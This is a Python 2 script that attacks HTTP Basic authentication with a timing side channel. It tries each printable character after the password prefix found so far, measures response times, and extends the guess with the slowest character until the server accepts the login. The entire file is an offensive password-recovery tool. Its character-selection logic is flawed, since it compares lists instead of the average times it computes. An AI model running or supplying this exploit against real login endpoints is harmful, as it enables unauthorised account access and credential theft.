#!/usr/bin/python

import requests
import datetime
import string
import sys

ALPHABET = string.printable
RETRIES = 1

def fetch(url, username, password):
    a = datetime.datetime.now()
    r = requests.get(url, auth=requests.auth.HTTPBasicAuth(username, password))
    if r.status_code == 200:
        return 0
    b = datetime.datetime.now()
    return (b - a).total_seconds()

def main(url, username):

    pass_so_far = ''
    while True:
        print '\n[>] Password so far: "%s"\n' % pass_so_far
        times = {}
        avg_times = {}
        for p in ALPHABET:
            times[p] = []
            avg_times[p] = 0.0
            for i in range(RETRIES):
                password = pass_so_far + p
                t = fetch(url, username, password)
                if t == 0:
                    print 'Password found: "%s"' % password
                    return
                times[p].append(t)

            avg_times[p] = sum(times[p]) / float(RETRIES)
            if ord(p) > 32:
                print '\tLetter: "%c" - time: %f' % (p, avg_times[p])
        
        max_time = [0,0]
        for letter, time_ in times.items():
            if time_ > max_time[1]:
                max_time[0] = letter
                max_time[1] = time_
            
        pass_so_far += max_time[0]

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print 'usage: http-auth-timing.py <url> <username>'

    main(sys.argv[1], sys.argv[2])